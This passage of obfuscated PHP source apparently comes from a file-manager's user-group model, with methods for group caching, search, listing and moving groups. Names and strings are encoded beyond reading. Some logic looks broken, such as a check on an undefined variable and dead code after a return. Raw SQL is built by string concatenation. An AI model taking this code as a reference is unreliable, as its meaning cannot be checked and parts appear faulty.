[182]] . $œõıå· [50]; $this->_changeChildLevel($”–·Ñ¹Ï, $§½¢İû­); $this->_clearCache($§½¢İû­[$œõıå· [1899]]); $this->_clearCache($”–·Ñ¹Ï[$œõıå· [182]]); } } if (isset($Ñï‹°†Œ[$œõıå· [32]])) { $this->setNamePinyin($ÖÃ®ÓŸá, $Ñï‹°†Œ[$œõıå· [32]]); } if (isset($Ñï‹°†Œ[$œõıå· [1985]])) { $this->metaSet($ÖÃ®ÓŸá, array($œõıå· [1985] => $Ñï‹°†Œ[$œõıå· [1985]], $œõıå· [1986] => $Ñï‹°†Œ[$œõıå· [1986]])); unset($Ñï‹°†Œ[$œõıå· [1985]]); unset($Ñï‹°†Œ[$œõıå· [1986]]); } $this->_clearChildrenCache($”–·Ñ¹Ï); return $this->where(array($œõıå· [1987] => $ÖÃ®ÓŸá))->save($Ñï‹°†Œ); } private function _clearChildrenCache($éßšößÕ) { $íİÒÖ¹ =& $_SERVER[ò«¥Ê‡å]; $¼¯ÔÖËÅ = array($íİÒÖ¹[622] => array($íİÒÖ¹[582], $éßšößÕ[$íİÒÖ¹[555]] . $éßšößÕ[$íİÒÖ¹[1899]] . $íİÒÖ¹[583])); $Æ§¿‘Ø£ = $this->field($íİÒÖ¹[1899])->where($¼¯ÔÖËÅ)->select(); foreach ($Æ§¿‘Ø£ as $‚—Úş®£) { $this->_clearCache($‚—Úş®£[$íİÒÖ¹[1899]]); } } private function _clearCache($›‚ÚŸ†ß) { $ï²Â”­ =& $_SERVER[ò«¥Ê‡å]; $this->cacheFunctionClear($ï²Â”­[1981], $›‚ÚŸ†ß); $this->cacheFunctionClear($ï²Â”­[1982], $›‚ÚŸ†ß); } private function _changeChildLevel($÷®Ò¢Ÿß, $º­¶²Ïı, $³Ş‚ß¨ = false) { $Ê¿ÀÚ =& $_SERVER[ò«¥Ê‡å]; $úÁ«ıó¹ = $÷®Ò¢Ÿß[$Ê¿ÀÚ[555]] . $÷®Ò¢Ÿß[$Ê¿ÀÚ[1899]] . $Ê¿ÀÚ[50]; $îĞÃğ•Ì = $º­¶²Ïı[$Ê¿ÀÚ[555]] . $º­¶²Ïı[$Ê¿ÀÚ[1899]] . $Ê¿ÀÚ[50] . $÷®Ò¢Ÿß[$Ê¿ÀÚ[1899]] . $Ê¿ÀÚ[50]; if ($³Ş‚ß¨) { $îĞÃğ•Ì = $º­¶²Ïı[$Ê¿ÀÚ[555]] . $º­¶²Ïı[$Ê¿ÀÚ[1899]] . $Ê¿ÀÚ[50]; } $ãğ¾¯¾ = array($Ê¿ÀÚ[622] => array($Ê¿ÀÚ[582], $÷®Ò¢Ÿß[$Ê¿ÀÚ[555]] . $÷®Ò¢Ÿß[$Ê¿ÀÚ[1899]] . $Ê¿ÀÚ[583])); $í·‚È¤ë = array($Ê¿ÀÚ[622] => array($Ê¿ÀÚ[631], "\x72\145\160\154\141\x63\145\50\160\141\162\145\x6e\x74\x4c\145\x76\x65\154\54\47{$úÁ«ıó¹}\x27\x2c\47{$îĞÃğ•Ì}\x27\x29")); $this->_clearChildrenCache($÷®Ò¢Ÿß); $this->where($ãğ¾¯¾)->data($í·‚È¤ë)->save(); } public function setNamePinyin($®‘ìÙ·, $ã¸êë± = false) { $Ï¢ÆÎü² =& $_SERVER[ò«¥Ê‡å]; if (!$ã¸êë±) { $ì“²Ô¼‡ = $this->getInfoSimple($®‘ìÙ·); $ã¸êë± = $ì“²Ô¼‡[$Ï¢ÆÎü²[32]]; } if (!Input::check($ã¸êë±, $Ï¢ÆÎü²[625])) { $this->metaSet($®‘ìÙ·, $Ï¢ÆÎü²[508], null); $this->metaSet($®‘ìÙ·, $Ï¢ÆÎü²[507], null); return; } $–¢»¸Ô§ = array($Ï¢ÆÎü²[508] => str_replace($Ï¢ÆÎü²[53], $Ï¢ÆÎü²[12], Pinyin::get($ã¸êë±)), $Ï¢ÆÎü²[507] => Pinyin::get($ã¸êë±, $Ï¢ÆÎü²[626])); $this->metaSet($®‘ìÙ·, $–¢»¸Ô§); } protected function groupStatus($şîâó·, $áÜ´¥Û´) { $ãÎĞÕÆ =& $_SERVER[ò«¥Ê‡å]; $òÛÙúÎß = $this->getInfoSimple($şîâó·); if (!$òÛÙúÎß) { return !1; } $this->_clearCache($şîâó·); return $this->metaSet($şîâó·, $ãÎĞÕÆ[789], $áÜ´¥Û´); if ($áÜ´¥Û´ == $ãÎĞÕÆ[90]) { $ÖÙí€„ = $this->parentLevelArray($òÛÙúÎß[$ãÎĞÕÆ[555]]); } else { } $ÖÙí€„[] = $òÛÙúÎß[$ãÎĞÕÆ[1899]]; $äâî£èğ = array(); foreach ($ÖÙí€„ as $şîâó·) { $äâî£èğ[] = array($ãÎĞÕÆ[1899] => $şîâó·, $ãÎĞÕÆ[96] => $ãÎĞÕÆ[789], $ãÎĞÕÆ[420] => $áÜ´¥Û´); $this->_clearCache($şîâó·); } return Model($ãÎĞÕÆ[1988])->addAll($äâî£èğ, array(), !0); } protected function groupRemove($éê™‘º, $åïüÔ‡à = false) { $åŸ´š¦› =& $_SERVER[ò«¥Ê‡å]; $‰ÈËãşğ = array($åŸ´š¦›[1899] => $éê™‘º); $¯‘í•œ× = $this->where($‰ÈËãşğ)->find(); if (!$¯‘í•œ× || $¯‘í•œ×[$åŸ´š¦›[182]] == 0) { return !1; } if (!$åïüÔ‡à) { $’ëáâù = $this->getInfoSimple($¯‘í•œ×[$åŸ´š¦›[182]]); $this->_changeChildLevel($¯‘í•œ×, $’ëáâù, !0); $this->where(array($åŸ´š¦›[182] => $éê™‘º))->save(array($åŸ´š¦›[182] => $¯‘í•œ×[$åŸ´š¦›[182]])); $this->_clearCache($’ëáâù[$åŸ´š¦›[1899]]); } Model($åŸ´š¦›[1988])->where($‰ÈËãşğ)->delete(); Model($åŸ´š¦›[1989])->where($‰ÈËãşğ)->delete(); Model($åŸ´š¦›[871])->groupRootRemove($éê™‘º); $this->_clearCache($¯‘í•œ×[$åŸ´š¦›[182]]); return $this->where($‰ÈËãşğ)->delete(); } protected function groupSort($â‘ÅˆÈ) { $Àæ¯ÕÊÑ =& $_SERVER[ò«¥Ê‡å]; $€ã‹Ã”™ = array(); foreach ($â‘ÅˆÈ as $²á•ÃÜ => $ìğÅÆÕõ) { $€ã‹Ã”™[] = array($Àæ¯ÕÊÑ[1899], $ìğÅÆÕõ, $Àæ¯ÕÊÑ[1923], $²á•ÃÜ + 1); } $this->saveAll($€ã‹Ã”™); } public function listData() { $ùòÈ¿Üö = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ùòÈ¿Üö[$_SERVER[ò«¥Ê‡å][415]]); return $ùòÈ¿Üö; } private function _makeOrder($¥®È¥Ğù = '') { $–ïâÄç =& $_SERVER[ò«¥Ê‡å]; $ÎÅ§‡Òª = array($–ïâÄç[1899], $–ïâÄç[32], $–ïâÄç[1888], $–ïâÄç[217]); $ÓúÃø = array($–ïâÄç[493] => $–ïâÄç[494], $–ïâÄç[495] => $–ïâÄç[496]); $Ùê İ‰ã = Input::get($–ïâÄç[500], $–ïâÄç[7], $–ïâÄç[1903], $ÎÅ§‡Òª); $±°Ô•æ® = Input::get($–ïâÄç[501], $–ïâÄç[7], $–ïâÄç[1990], array($–ïâÄç[1990], $–ïâÄç[495])); $±°Ô•æ® = $ÓúÃø[$±°Ô•æ®]; $¥®È¥Ğù = $¥®È¥Ğù . "{$Ùê İ‰ã}\x20{$±°Ô•æ®}\x2c\x20\147\x72\157\165\x70\111\x44\x20\x61\x73\x63"; return $this->order($¥®È¥Ğù); } public function listChild($¬Ä³ÈåÚ) { $¢…ë¤ıÔ =& $_SERVER[ò«¥Ê‡å]; $Ûù“–© = $this->where(array($¢…ë¤ıÔ[182] => $¬Ä³ÈåÚ))->_makeOrder()->selectPage(200); $this->_listDataApply($Ûù“–©[$¢…ë¤ıÔ[415]]); return $Ûù“–©; } public function listChildIds($ÎÂ‰¯ß²) { $úæ©ÎÒÅ =& $_SERVER[ò«¥Ê‡å]; if (is_string($Ú¼Åà)) { $ÎÂ‰¯ß² = explode($úæ©ÎÒÅ[50], $ÎÂ‰¯ß²); } $¨Ñı· = $this->where(array($úæ©ÎÒÅ[1899] => array($úæ©ÎÒÅ[7], $ÎÂ‰¯ß²)))->field($úæ©ÎÒÅ[1991])->select(); if (!$¨Ñı·) { return !1; } $ù—’ê¬ = array(); foreach ($¨Ñı· as $•´ Œ¦…) { $ù—’ê¬[] = "\x73\x65\154\145\x63\x74\40\147\x72\x6f\x75\160\x49\104\x20\x66\x72\x6f\x6d\x20\140\x67\x72\x6f\x75\160\140\40\167\x68\145\x72\145\x20\160\x61\x72\x65\x6e\164\x4c\x65\166\x65\154\x20\154\x69\x6b\145\x20\x27{$•´ Œ¦…[$úæ©ÎÒÅ[555]]}{$•´ Œ¦…[$úæ©ÎÒÅ[1899]]}\54\45\47"; } $ù—’ê¬ = implode($úæ©ÎÒÅ[1992], $ù—’ê¬); $¨Ñı· = $this->query($ù—’ê¬); if (!$¨Ñı·) { return array(); } $ÎÂ‰¯ß² = array_to_keyvalue($¨Ñı·, $úæ©ÎÒÅ[12], $úæ©ÎÒÅ[1899]); return array_unique($ÎÂ‰¯ß²); } public function listByID($æ¦Ë‚®£) { $†ÇøèÉ’ =& $_SERVER[ò«¥Ê‡å]; if (!$æ¦Ë‚®£) { return array(); } $Õµäí· = array($†ÇøèÉ’[1899] => array($†ÇøèÉ’[7], $æ¦Ë‚®£)); $¦ÈÔÖş¸ = $this->where($Õµäí·)->select(); $¦ÈÔÖş¸ = array_sort_keep($¦ÈÔÖş¸, $†ÇøèÉ’[1899], $æ¦Ë‚®£); $this->_listDataApply($¦ÈÔÖş¸); return $¦ÈÔÖş¸; } public function listSearch($„ÕŠ¬’õ) { $øç‹Ã½ =& $_SERVER[ò«¥Ê‡å]; $àÖô‡ÛÓ = $„ÕŠ¬’õ[$øç‹Ã½[1993]]; $ãà”é¢¼ = isset($„ÕŠ¬’õ[$øç‹Ã½[1994]]) ? $„ÕŠ¬’õ[$øç‹Ã½[1994]] : !1; if (!trim($àÖô‡ÛÓ)) { return !1; } $àÖô‡ÛÓ = str_replace($øç‹Ã½[1995], $øç‹Ã½[1996], $àÖô‡ÛÓ); $¸Ğáó‹™ = array($øç‹Ã½[1899] => array($øç‹Ã½[429], "{$àÖô‡ÛÓ}\x25"), $øç‹Ã½[32] => array($øç‹Ã½[429], "\45{$àÖô‡ÛÓ}\x25"), $øç‹Ã½[1047] => $øç‹Ã½[1997]); if ($ãà”é¢¼) { $ˆ‰Ûôç = $this->getInfoSimple($ãà”é¢¼); $Ë¥¾Êö¨ = $ˆ‰Ûôç[$øç‹Ã½[555]] . $ãà”é¢¼ . $øç‹Ã½[583]; $¸Ğáó‹™ = array($¸Ğáó‹™, array($øç‹Ã½[555] => array($øç‹Ã½[429], $Ë¥¾Êö¨))); } $¸Ğáó‹™ = $this->parseWhereLike($¸Ğáó‹™); $š¾Ù’¼‚ = $this->_makeOrder()->where($¸Ğáó‹™)->selectPage(20); $š¾Ù’¼‚ = $š¾Ù’¼‚ ? $š¾Ù’¼‚ : array($øç‹Ã½[415] => array(), $øç‹Ã½[412] => array()); if (!$š¾Ù’¼‚ || count($š¾Ù’¼‚[$øç‹Ã½[415]]) < 5 && Input::check($àÖô‡ÛÓ, $øç‹Ã½[364])) { $Éô¡Ò‘û = $this->groupChildrenAll($ãà”é¢¼); $ÛÃÆÀøÖ = $this->_searchFromMeta($øç‹Ã½[507], $àÖô‡ÛÓ, 10, $Éô¡Ò‘û); $û”—ıï¸ = $this->_searchFromMeta($øç‹Ã½[508], $àÖô‡ÛÓ, 10, $Éô¡Ò‘û); $— €¡í„ = array_merge($ÛÃÆÀøÖ, $û”—ıï¸, $š¾Ù’¼‚[$øç‹Ã½[415]]); $š¾Ù’¼‚[$øç‹Ã½[415]] = array_unique_by_key($— €¡í„, $øç‹Ã½[1899]); $š¾Ù’¼‚[$øç‹Ã½[412]][$øç‹Ã½[413]] = count($š¾Ù’¼‚[$øç‹Ã½[415]]); $š¾Ù’¼‚[$øç‹Ã½[412]][$øç‹Ã½[414]] = ceil($š¾Ù’¼‚[$øç‹Ã½[412]][$øç‹Ã½[413]] / $š¾Ù’¼‚[$øç‹Ã½[412]][$øç‹Ã½[409]]); } $this->_listDataApply($š¾Ù’¼‚[$øç‹Ã½[415]]); return $š¾Ù’¼‚; } protected function groupChildrenAll($ëƒÅõı) { $îÖæÉ‚• =& $_SERVER[ò«¥Ê‡å]; if (!$ëƒÅõı) { return !1; } if (!is_array($ëƒÅõı)) { $ëƒÅõı = array($ëƒÅõı); } $¡Úõ”‘ = $ëƒÅõı; foreach ($ëƒÅõı as $İ¶Ôğ¹Á) { $§ÖŒ–©… = $this->getInfoSimple($İ¶Ôğ¹Á); $îîãİí£ = array($îÖæÉ‚•[555] => array($îÖæÉ‚•[429], $§ÖŒ–©…[$îÖæÉ‚•[555]] . $İ¶Ôğ¹Á . $îÖæÉ‚•[583])); $ÁŒçÈöÛ = $this->field($îÖæÉ‚•[1899])->where($îîãİí£)->select(); $¡Úõ”‘ = array_merge($¡Úõ”‘, array_to_keyvalue($ÁŒçÈöÛ, $îÖæÉ‚•[12], $îÖæÉ‚•[1899])); } return array_unique($¡Úõ”‘); } private function _searchFromMeta($¨‘‘â”¡, $ÈÆ…‰º¤, $°ø–©, $Ú¶÷è‡Š) { $õ‡ÌÆ¡Ñ =& $_SERVER[ò«¥Ê‡å]; $ÈÆ…‰º¤ = strtolower($ÈÆ…‰º¤); $·úŸüÚÃ = array($õ‡ÌÆ¡Ñ[96] => $¨‘‘â”¡, $õ‡ÌÆ¡Ñ[420] => array($õ‡ÌÆ¡Ñ[429], "\45{$ÈÆ…‰º¤}\45")); $·úŸüÚÃ = $this->parseWhereLike($·úŸüÚÃ); if ($Ú¶÷è‡Š) { $·úŸüÚÃ[$õ‡ÌÆ¡Ñ[1899]] = array($õ‡ÌÆ¡Ñ[7], $Ú¶÷è‡Š); } $Œœïˆ´Š = Model($õ‡ÌÆ¡Ñ[1998])->where($·úŸüÚÃ)->limit($°ø–©)->select(); if (!$Œœïˆ´Š) { return array(); } $Œœïˆ´Š = array_to_keyvalue($Œœïˆ´Š, $õ‡ÌÆ¡Ñ[12], $õ‡ÌÆ¡Ñ[1899]); $Üä’êğ = $this->where(array($õ‡ÌÆ¡Ñ[1987] => array($õ‡ÌÆ¡Ñ[7], $Œœïˆ´Š)))->select(); if (!$Üä’êğ) { return array(); } return $Üä’êğ; } protected function _listDataApplyItem($Á…à‰¶€) { $›ûÛüµ¯ = array($Á…à‰¶€); $this->_listDataApply($›ûÛüµ¯); return $›ûÛüµ¯[0]; } protected function _listDataApply(&$õ¯ÏıÜæ) { $¶¬îÍéÅ =& $_SERVER[ò«¥Ê‡å]; if (!$õ¯ÏıÜæ) { return; } $†™Æ•–Ğ = array_to_keyvalue($õ¯ÏıÜæ, $¶¬îÍéÅ[12], $¶¬îÍéÅ[1899]); $this->_listAppendChildren($õ¯ÏıÜæ); $this->_listAppendChildrenMember($õ¯ÏıÜæ); $this->_listAppendMeta($õ¯ÏıÜæ, $†™Æ•–Ğ); $this->_listAppendParent($õ¯ÏıÜæ); $this->_listAppendSourceRoot($õ¯ÏıÜæ, $†™Æ•–Ğ); } private function _listAppendChildren(&$Ä­ªŸŠ) { $›±à‚Çé =& $_SERVER[ò«¥Ê‡å]; $×Íö×¬ = array_to_keyvalue($Ä­ªŸŠ, $›±à‚Çé[12], $›±à‚Çé[1899]); $Îç½Ê• = array($›±à‚Çé[182] => array($›±à‚Çé[7], $×Íö×¬)); $ô€şë§€ = array($›±à‚Çé[182], $›±à‚Çé[1999] => $›±à‚Çé[536]); $÷µ¡…À = $this->field($ô€şë§€)->where($Îç½Ê•)->group($›±à‚Çé[182])->select(); $ÀºÇÂ–ô = array_to_keyvalue($÷µ¡…À, $›±à‚Çé[182], $›±à‚Çé[536]); foreach ($Ä­ªŸŠ as &$¦ËèØ¿˜) { $«à£Úß» = $¦ËèØ¿˜[$›±à‚Çé[1899]]; $¦ËèØ¿˜[$›±à‚Çé[2000]] = isset($ÀºÇÂ–ô[$«à£Úß»]) ? intval($ÀºÇÂ–ô[$«à£Úß»]) : !1; } unset($¦ËèØ¿˜); } private function _listAppendChildrenMember(&$ŞÉä±è) { $í¤îÍ¦ï =& $_SERVER[ò«¥Ê‡å]; $î¤½°È = array_to_keyvalue($ŞÉä±è, $í¤îÍ¦ï[12], $í¤îÍ¦ï[1899]); $¿®Â½ƒ = array($í¤îÍ¦ï[1899] => array($í¤îÍ¦ï[7], $î¤½°È)); $¨Ñ¾Æ£‹ = array($í¤îÍ¦ï[1899], $í¤îÍ¦ï[1999] => $í¤îÍ¦ï[536]); $¿æÉşØã = Model($í¤îÍ¦ï[1989])->field($¨Ñ¾Æ£‹)->where($¿®Â½ƒ)->group($í¤îÍ¦ï[1899])->select(); $àŒÆ©³Ê = array_to_keyvalue($¿æÉşØã, $í¤îÍ¦ï[1899], $í¤îÍ¦ï[536]); foreach ($ŞÉä±è as &$Íáü«ó´) { $‹´º‰á­ = $Íáü«ó´[$í¤îÍ¦ï[1899]]; $Íáü«ó´[$í¤îÍ¦ï[2001]] = isset($àŒÆ©³Ê[$‹´º‰á­]) ? intval($àŒÆ©³Ê[$‹´º‰á­]) : !1; } unset($Íáü«ó´); } private function _listAppendMeta(&$ëÈ¯î¬˜, $£ğãÃÌÄ) { $Ö’±Ø¸– =& $_SERVER[ò«¥Ê‡å]; $Ú¼†˜¹Ê = array($Ö’±Ø¸–[1899] => array($Ö’±Ø¸–[7], $£ğãÃÌÄ)); $É˜±ä–É = Model($Ö’±Ø¸–[1988])->where($Ú¼†˜¹Ê)->select(); $É˜±ä–É = array_to_keyvalue_group($É˜±ä–É, $Ö’±Ø¸–[1899]); foreach ($É˜±ä–É as &$üùòÛÚó) { $üùòÛÚó = array_to_keyvalue($üùòÛÚó, $Ö’±Ø¸–[96], $Ö’±Ø¸–[420]); } unset($üùòÛÚó); foreach ($ëÈ¯î¬˜ as &$á¦‹³³”) { $á¦‹³³”[$Ö’±Ø¸–[509]] = array(); if (isset($É˜±ä–É[$á¦‹³³”[$Ö’±Ø¸–[1899]]])) { $á¦‹³³”[$Ö’±Ø¸–[509]] = $É˜±ä–É[$á¦‹³³”[$Ö’±Ø¸–[1899]]]; } } unset($á¦‹³³”); } protected function parentLevelArray($ñ£©àØõ) { $‚¢ÃáÉñ =& $_SERVER[ò«¥Ê‡å]; $ñ£©àØõ = explode($‚¢ÃáÉñ[50], trim($ñ£©àØõ, $‚¢ÃáÉñ[50])); $ñ£©àØõ = array_remove_value($ñ£©àØõ, $‚¢ÃáÉñ[214]); return $ñ£©àØõ; } protected function parentInGroup($ĞîğÔ«Ô, $¯Ò¬Ëğ) { $ÈáØïœ® =& $_SERVER[ò«¥Ê‡å]; $Óœì†ë = $this->getInfoSimple($ĞîğÔ«Ô); if (!$Óœì†ë) { return !0; } $¬§ÈËå¬ = $this->parentLevelArray($Óœì†ë[$ÈáØïœ®[555]]); $¬§ÈËå¬[] = $ĞîğÔ«Ô; foreach ($¬§ÈËå¬ as $ĞîğÔ«Ô) { if (in_array($ĞîğÔ«Ô . $ÈáØïœ®[12], $¯Ò¬Ëğ)) { return !0; } } return !1; } private function _listAppendParent(&$İ÷Íå¸Ù) { $»šÉì¬ê =& $_SERVER[ò«¥Ê‡å]; $œäÁ¹•ø = array(); foreach ($İ÷Íå¸Ù as &$¹á«Ëø•) { $œäÁ¹•ø[$¹á«Ëø•[$»šÉì¬ê[1899]]] = $¹á«Ëø•[$»šÉì¬ê[32]]; $ò¬ŸØÂÑ = $this->parentLevelArray($¹á«Ëø•[$»šÉì¬ê[555]]); foreach ($ò¬ŸØÂÑ as $ÈîÂ²Õ) { if (!isset($œäÁ¹•ø[$ÈîÂ²Õ])) { $œäÁ¹•ø[$ÈîÂ²Õ] = 0; } } } unset($¹á«Ëø•); foreach ($œäÁ¹•ø as $ˆæõ± => $‚·ˆÕ•é) { if ($‚·ˆÕ•é) { continue; } $ôâÌÀ†ğ = $this->getInfoSimple($ˆæõ±); $œäÁ¹•ø[$ˆæõ±] = $ôâÌÀ†ğ[$»šÉì¬ê[32]]; } $´·²àÅé = $GLOBALS[$»šÉì¬ê[6]][$»šÉì¬ê[91]][$»šÉì¬ê[2002]]; if (KodUser::isRoot()) { $´·²àÅé = !1; } foreach ($İ÷Íå¸Ù as &$¹á«Ëø•) { $ò¬ŸØÂÑ = $this->parentLevelArray($¹á«Ëø•[$»šÉì¬ê[555]]); $«›•—¹ = $»šÉì¬ê[12]; foreach ($ò¬ŸØÂÑ as $ˆæõ± => $ÈîÂ²Õ) { if ($´·²àÅé && $ˆæõ± == 0) { continue; } $«›•—¹ .= $œäÁ¹•ø[$ÈîÂ²Õ] . $»šÉì¬ê[8]; } if ($ò¬ŸØÂÑ) { $«›•—¹ .= $¹á«Ëø•[$»šÉì¬ê[32]]; } $¹á«Ëø•[$»šÉì¬ê[560]] = str_replace($»šÉì¬ê[563], $»šÉì¬ê[8], $«›•—¹); } unset($¹á«Ëø•); } private function _listAppendSourceRoot(&$ıï…ìˆŒ, $’×Š¥Âù) { $×Í©ÔĞ =& $_SERVER[ò«¥Ê‡å]; $–‡®‘ü­ = Model($×Í©ÔĞ[871])->listSourceRoot(SourceModel::TYPE_GROUP, $’×Š¥Âù); $–‡®‘ü­ = array_to_keyvalue($–‡®‘ü­, $×Í©ÔĞ[540]); $–‡®‘ü­ = array_remove_key($–‡®‘ü­, $×Í©ÔĞ[540]); foreach ($ıï…ìˆŒ as &$Ñù‹òä) { $Ñù‹òä[$×Í©ÔĞ[89]] = $–‡®‘ü­[$Ñù‹òä[$×Í©ÔĞ[1899]]] ? $–‡®‘ü­[$Ñù‹òä[$×Í©ÔĞ[1899]]] : array(); } unset($Ñù‹òä); } protected function groupMerge($Œ´¤êèÏ) { $Œ´¤êèÏ = array_values(array_unique($Œ´¤êèÏ)); $Ö´º¿ú” = array(); for ($Ÿúê¬² = 0; $Ÿúê¬² < count($Œ´¤êèÏ); $Ÿúê¬²++) { $ßš¥Á‘ò = !1; for ($²Ã’ÔÉ = 0; $²Ã’ÔÉ < count($Œ´¤êèÏ); $²Ã’ÔÉ++) { if ($Ÿúê¬² == $²Ã’ÔÉ) { continue; } if ($this->isParentOf($Œ´¤êèÏ[$²Ã’ÔÉ], $Œ´¤êèÏ[$Ÿúê¬²])) { $ßš¥Á‘ò = !0; break; } } if (!$ßš¥Á‘ò) { $Ö´º¿ú”[] = $Œ´¤êèÏ[$Ÿúê¬²]; } } return $Ö´º¿ú”; } protected function isParentOf($®òâ¿ß, $†âº‹Ÿè) { $¶¨šä =& $_SERVER[ò«¥Ê‡å]; if (!$®òâ¿ß || !$†âº‹Ÿè || $®òâ¿ß == $†âº‹Ÿè) { return !1; } $ôø­ùôè = $this->getInfoSimple($®òâ¿ß); $ÃÏú®É = $this->getInfoSimple($†âº‹Ÿè); $¥š‡š•İ = $ôø­ùôè[$¶¨šä[555]] . $®òâ¿ß . $¶¨šä[50]; if (substr($ÃÏú®É[$¶¨šä[555]], 0, strlen($¥š‡š•İ)) == $¥š‡š•İ) { return !0; } return !1; } public function groupShowRoot($’¡šÊ¾, $ÏÊûÏ‚Ó = false) { $ÁİˆïäÆ =& $_SERVER[ò«¥Ê‡å]; $Ú’»ù–Ê = $this->getInfo($’¡šÊ¾); if (!$Ú’»ù–Ê) { return array(); } $ÙÚƒ½—å = $this->parentLevelArray($Ú’»ù–Ê[$ÁİˆïäÆ[555]]); $æÇö²¤º = array($’¡šÊ¾); if (count($ÙÚƒ½—å) == 0) { return $æÇö²¤º; } if ($ÏÊûÏ‚Ó && count($ÙÚƒ½—å) == 1) { return $æÇö²¤º; } if (!$Ú’»ù–Ê[$ÁİˆïäÆ[509]] || !isset($Ú’»ù–Ê[$ÁİˆïäÆ[509]][$ÁİˆïäÆ[1985]]) || $Ú’»ù–Ê[$ÁİˆïäÆ[509]][$ÁİˆïäÆ[1985]] == $ÁİˆïäÆ[1954]) { return $this->groupShowRoot($ÙÚƒ½—å[count($ÙÚƒ½—å) - 1], $ÏÊûÏ‚Ó); } if ($Ú’»ù–Ê[$ÁİˆïäÆ[509]][$ÁİˆïäÆ[1985]] == $ÁİˆïäÆ[403]) { $ëÃ“›˜ = explode($ÁİˆïäÆ[50], $Ú’»ù–Ê[$ÁİˆïäÆ[509]][$ÁİˆïäÆ[1986]]); if ($ëÃ“›˜) { $æÇö²¤º = array_merge($æÇö²¤º, $ëÃ“›˜); } } return $æÇö²¤º; } protected function resetParentLevel() { $éç¤÷Ñ =& $_SERVER[ò«¥Ê‡å]; $àßÛïû– = $éç¤÷Ñ[1899]; $Ó‘‚¤ĞÓ = $this->select(); $Ó‘‚¤ĞÓ = array_to_keyvalue($Ó‘‚¤ĞÓ, $àßÛïû–); foreach ($Ó‘‚¤ĞÓ as $©â¼ªÚ) { $Ûˆ¾½â = $©â¼ªÚ; $òìÛ˜×› = array(); while ($Ûˆ¾½â[$éç¤÷Ñ[182]] != 0) { $òìÛ˜×›[] = $Ûˆ¾½â[$éç¤÷Ñ[182]]; $Ûˆ¾½â = $Ó‘‚¤ĞÓ[$Ûˆ¾½â[$éç¤÷Ñ[182]]]; } $òìÛ˜×›[] = 0; $òìÛ˜×› = $éç¤÷Ñ[50] . implode($éç¤÷Ñ[50], array_reverse($òìÛ˜×›)) . $éç¤÷Ñ[50]; $this->setNamePinyin($©â¼ªÚ[$àßÛïû–], $©â¼ªÚ[$éç¤÷Ñ[32]]); $this->where(array($àßÛïû– => $©â¼ªÚ[$àßÛïû–]))->save(array($éç¤÷Ñ[622] => $òìÛ˜×›)); } return $Ó‘‚¤ĞÓ; } public function groupNameAuto($ÜÂÚ«ªê, $Öş°ÀŠÕ) { $ƒ‡©Á« =& $_SERVER[ò«¥Ê‡å]; $çœòÕ©Û = $this->where(array($ƒ‡©Á«[447] => $ÜÂÚ«ªê))->getField($ƒ‡©Á«[32], !0); if (!$çœòÕ©Û || !in_array($Öş°ÀŠÕ, $çœòÕ©Û)) { return $Öş°ÀŠÕ; } for ($‘½‡§Õ = 1; $‘½‡§Õ <= count($çœòÕ©Û) + 1; $‘½‡§Õ++) { $ä…—©öˆ = $Öş°ÀŠÕ . "\50{$‘½‡§Õ}\51"; if (!in_array($ä…—©öˆ, $çœòÕ©Û)) { return $ä…—©öˆ; } } } public function groupSwitch($ñ‘‡“æÖ, $ı¹¿’á) { $áõ¦¶ù” =& $_SERVER[ò«¥Ê‡å]; $Ö‡–¡ = array($áõ¦¶ù”[1899] => array($áõ¦¶ù”[7], array($ñ‘‡“æÖ, $ı¹¿’á))); $ïÊÛ¯€ = $this->where($Ö‡–¡)->select(); $ïÊÛ¯€ = array_to_keyvalue($ïÊÛ¯€, $áõ¦¶ù”[1899]); if (!isset($ïÊÛ¯€[$ñ‘‡“æÖ]) || !isset($ïÊÛ¯€[$ı¹¿’á]) || $ïÊÛ¯€[$ñ‘‡“æÖ][$áõ¦¶ù”[182]] == 0) { return !1; } $Ö‡–¡ = array($áõ¦¶ù”[1899] => $ñ‘‡“æÖ); $õÊôí±‚ = Model($áõ¦¶ù”[1989])->where($Ö‡–¡)->select(); if (!$õÊôí±‚) { $õÊôí±‚ = array(); } foreach ($õÊôí±‚ as $‚ı¼êñ) { $¶šøß‹ = $‚ı¼êñ[$áõ¦¶ù”[1701]]; $Ö‡–¡ = array($áõ¦¶ù”[1701] => $¶šøß‹, $áõ¦¶ù”[1899] => $ı¹¿’á); $éè±é¬± = Model($áõ¦¶ù”[1989])->where($Ö‡–¡)->find(); if (!$éè±é¬±) { $ÈÛ°ˆ¯¾ = array($ı¹¿’á => $‚ı¼êñ[$áõ¦¶ù”[2003]]); Model($áõ¦¶ù”[569])->userGroupAdd($¶šøß‹, $ÈÛ°ˆ¯¾); } Model($áõ¦¶ù”[569])->userGroupRemove($¶šøß‹, $ñ‘‡“æÖ); } $Ö‡–¡ = array($áõ¦¶ù”[180] => 2, $áõ¦¶ù”[182] => 0, $áõ¦¶ù”[455] => 1, $áõ¦¶ù”[540] => array($áõ¦¶ù”[7], array($ñ‘‡“æÖ, $ı¹¿’á))); $ƒùİØ§‰ = Model($áõ¦¶ù”[871])->where($Ö‡–¡)->field($áõ¦¶ù”[2004])->select(); $ƒùİØ§‰ = array_to_keyvalue($ƒùİØ§‰, $áõ¦¶ù”[540], $áõ¦¶ù”[183]); $ú„ô¯á = !empty($ƒùİØ§‰[$ñ‘‡“æÖ]) ? $ƒùİØ§‰[$ñ‘‡“æÖ] : !1; if ($ú„ô¯á) { if (!$ƒùİØ§‰[$ı¹¿’á]) { $ƒùİØ§‰[$ı¹¿’á] = Model($áõ¦¶ù”[871])->groupRootAdd($ı¹¿’á); } $à•ó = $ƒùİØ§‰[$ı¹¿’á]; $Ö‡–¡ = array($áõ¦¶ù”[182] => $ú„ô¯á); $ƒùİØ§‰ = Model($áõ¦¶ù”[871])->where($Ö‡–¡)->field($áõ¦¶ù”[2005])->select(); if (!$ƒùİØ§‰) { $ƒùİØ§‰ = array(); } Model($áõ¦¶ù”[871])->moveClearAuth = !1; foreach ($ƒùİØ§‰ as $¹Ô¤‘¤) { $ÓŒ®¹Ã = $¹Ô¤‘¤[$áõ¦¶ù”[455]] == $áõ¦¶ù”[90] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($áõ¦¶ù”[871])->move($¹Ô¤‘¤[$áõ¦¶ù”[183]], $à•ó, $ÓŒ®¹Ã); } Model($áõ¦¶ù”[871])->moveClearAuth = !0; $Ö‡–¡ = array($áõ¦¶ù”[180] => 2, $áõ¦¶ù”[540] => 